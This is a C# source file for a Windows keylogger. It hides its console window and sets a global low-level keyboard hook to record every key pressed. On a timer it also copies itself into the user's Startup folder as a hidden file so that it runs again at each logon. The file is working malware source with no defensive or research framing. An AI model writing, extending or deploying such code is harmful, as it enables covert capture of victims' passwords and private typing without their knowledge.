using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Keylogger.Keylogger
{
    public class Keylogger
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int SW_HIDE = 0;
        private static readonly LowLevelKeyboardProc proc = HookCallback;
        private static IntPtr hookID = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public static int KeystrokeCount { get; set; }

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            KeystrokeCount = 0;

            var startupTimer = new Timer()
            {
                Enabled = true,
                Interval = 64000
            };

            startupTimer.Start();
            startupTimer.Tick += Copy;

            hookID = SetHook(proc);
            Application.Run();
            UnhookWindowsHookEx(hookID);
        }

        private static void Copy(object sender, EventArgs e)
        {
            var name = Path.GetFileName(Assembly.GetEntryAssembly().Location);

            if(File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "//" + name))
            {
                return;
            }
            else
            {
                try
                {
                    File.Copy(Directory.GetCurrentDirectory() + "//" + name, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "//" + name);
                    File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "//" + name, FileAttributes.Hidden);
                }
                catch(Exception)
                {

                }
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process process = Process.GetCurrentProcess())
            using(ProcessModule module = process.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(module.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if(nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                SaveKeyData.SaveKey((Keys)vkCode);
                KeystrokeCount++;
            }

            return CallNextHookEx(hookID, nCode, wParam, lParam);
        }
    }
}